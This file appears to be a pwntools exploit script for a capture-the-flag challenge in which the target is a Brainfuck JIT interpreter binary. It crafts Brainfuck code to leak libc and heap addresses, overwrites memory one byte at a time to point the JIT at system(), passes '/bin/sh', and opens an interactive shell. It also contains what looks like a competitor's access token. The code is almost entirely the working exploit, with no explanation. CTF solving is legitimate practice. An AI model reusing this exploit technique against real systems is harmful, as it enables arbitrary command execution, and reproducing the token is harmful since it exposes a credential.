from pwn import*
import sys,os,os.path
context.log_level='info'
context(os='linux', arch='amd64')
binary='./bf'
elf=ELF(binary)
debug=0
# code=b"+[->.+]" #stage1
code=b""
 
findchr=0x80
code+=b"+"*(0x100-findchr)
print(len(code))
code+=b"["
code+=b"-"*(0x100-findchr)
code+=b"<."
code+=b"+"*(0x100-findchr)
code+=b"]"
# code+=b","

eof=0x0d
code+=b"+"*(0x100-eof)
code+=b"["
code+=b"-"*(0x100-eof)
code+=b">.," 
code+=b"+"*(0x100-eof)
code+=b"]"
# code+=b","

print(len(code))
jit_idx=len(code)
code+=b"+[.],"
code=code.ljust(0x500,b".")
fd=open("./test","wb")
fd.write(code)
fd.close()

if debug==0:
    io=process([binary,"./test"])
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
elif debug==1:
    io = remote("prob13.geekgame.pku.edu.cn", 10013)
    libc = ELF("./libc-2.31.so",checksec=False)
elif debug==2:
    io = process(["python3", "service.py"])
    libc= ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)

s       = lambda data               :io.send(data) 
sa      = lambda data1,data         :io.sendafter(data1, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda data1,data         :io.sendlineafter(data1, data)
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)
rn      = lambda numb               :io.recvn(numb)
irt     = lambda                    :io.interactive()
# misc functions
uu32    = lambda data               :u32(data.ljust(4, b'\0'))
uu64    = lambda data               :u64(data.ljust(8, b'\0'))
leak    = lambda name,addr          :log.success('{} : {:#x}'.format(name, addr))
context.terminal = ['tmux','split','-h']

if debug==1:
    ru("Please input your token: ")
    sl("217:MEQCIHLpLiFNPYI3KBZxPt2PkPZ5IcH1pjr7nALhbc8hiwSlAiA0zL+Q3glpIqz9OOdkjaftoJhX3wu1zqjRAHqZl7iklA==")
    ru("give me code (hex): ")
    sl(code.hex())
if debug==2:
    ru("give me code (hex): ")
    sl(code.hex())

data=r()
from struct import pack,unpack
libc.address=unpack(">Q",data[23:23+8])[0] - 0x1f60-0x1eb000  #0x7ffff7dcd000
leak("libc",libc.address)
leak("system",libc.sym["system"])

heap=unpack(">Q",data[0x147:0x147+8])[0]   # 0x555555559390
leak("heap",heap)

count=0
stack_base=0x555555559470
code_base=0x55555555a480

s(bytes([data[-1]]))
for i in range(0xe):
    #r(1)
    s(bytes([0]))

#0x0000555555559338
#scode前放0
for i in range(0,code_base+0x10-0x0000555555559338,8):
    for i in range(8):
        #r(1)
        s(bytes([0]))
#code[0]放[/binsh]
data=b"<<<[.]".ljust(0xe,b"\x00")
for i in range(8):
    #r(1)
    s(bytes([data[i]]))

#0x55555555e560: 0x0000000000000000      0x000055555555a8f1
square_addr=0x55555555e560+8
jit_addr=0x55555555f9f0+0x10+8*jit_idx

for i in range(0,square_addr-(code_base+8)+8,8): 
    count+=1
    print(count)
    _=0x55555555a490 +(heap-0x555555559390)
    data=pack("<Q",_)
    for i in range(8):
        #r(1)
        s(bytes([data[i]]))

for i in range(0,jit_addr-square_addr+0x100,8):
    data=pack("<Q",libc.sym["system"])
    for i in range(8):
        #r(1)
        s(bytes([data[i]]))

print(jit_idx)
context.log_level='debug'
#gdb.attach(io,"b *(0x0000000001CE7    +0x555555554000)")
data=b"/bin/sh\x00"
for i in range(7):
    #r(1)
    s(bytes([data[i]]))
#r(1)
s(bytes([eof]))
io.interactive()
